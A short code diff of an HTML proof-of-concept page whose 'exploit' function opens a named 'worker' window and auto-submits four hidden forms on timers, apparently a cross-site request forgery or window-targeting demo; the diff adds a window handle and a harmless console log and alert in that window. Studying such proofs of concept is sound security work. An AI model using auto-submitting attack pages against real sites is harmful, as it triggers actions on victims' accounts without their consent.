@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html>
 <body>
@@ -21,7 +20,7 @@
 
   <script>
     function exploit(data) {
-        window.open('', 'worker');
+        const workerWindow = window.open('', 'worker');
 
         setTimeout(() => {
             document.getElementById('f1').submit();
@@ -35,6 +34,12 @@
         setTimeout(() => {
             document.getElementById('f4').submit();
         }, 12000);
+
+        // Вывод в консоль открытой вкладки
+        setTimeout(() => {
+            workerWindow.console.log('Hi!');
+            workerWindow.alert('Alert!');
+        }, 15000);
     }
 </script>
 
